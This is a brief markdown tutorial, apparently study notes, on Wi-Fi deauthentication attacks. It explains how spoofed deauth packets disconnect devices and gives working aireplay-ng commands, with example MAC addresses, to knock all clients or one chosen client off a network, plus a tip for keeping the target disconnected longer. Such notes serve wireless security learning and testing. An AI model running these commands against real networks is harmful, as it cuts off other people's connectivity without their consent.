## Theory ...
- This attack is used to **dissconect** any device from the any network within our range even if the network is protected with a **key**.
- Hackers sends Deauthenticated packets to the **router** pretending to be the target machine. By Sppofing it's MAC Address.  Acctually Tring to **trick the router**.
- **At the Same time** : 
- Hacker sends packets the **target machine** pretending to be the router. Here **tricking the target machine** by telling him to **re-authenticate**.

# Lets Attack : 👊🏻

#### To De-authenticate  all clients in a specific Network : 
```sh
aireplay-ng --deauth <Number_Of_Packets> -a <AP> <Interface>
#aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 mon0
```

#### To De-authenticate  a specific client in a specific Network :
```sh
aireplay-ng --deauth <Number_Of_Packets> -a <AP> -c <target>  <Interface>
#aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:11:22:AA:BB:CC mon0
```

> [!tip]
> The more the number of Deauth Packets, the more time this will make the target to remain dsconnected from router.
